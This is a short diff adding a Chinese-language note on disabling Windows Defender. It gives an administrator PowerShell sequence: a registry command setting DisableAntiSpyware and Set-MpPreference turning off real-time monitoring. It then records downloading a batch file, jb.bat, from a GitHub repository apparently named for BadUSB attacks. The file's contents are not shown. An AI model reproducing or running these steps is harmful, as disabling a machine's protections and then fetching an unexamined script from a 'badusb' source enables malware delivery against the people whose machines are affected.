@@ -1,0 +1,9 @@
+使用管理员权限打开pawershell关闭实时防护及安全防护，使用的命令是：
+reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender" /v "DisableAntiSpyware" /d 1 /t REG_DWORD /f
+如果要打开把1换成0
+Set-MpPreference -DisableRealtimeMonitoring $true
+如果要打开实时防护true改为false
+
+然后下载了jb.bat文件
+https://github.com/ll2310782478/badusb/releases/download/1/jb.bat
+
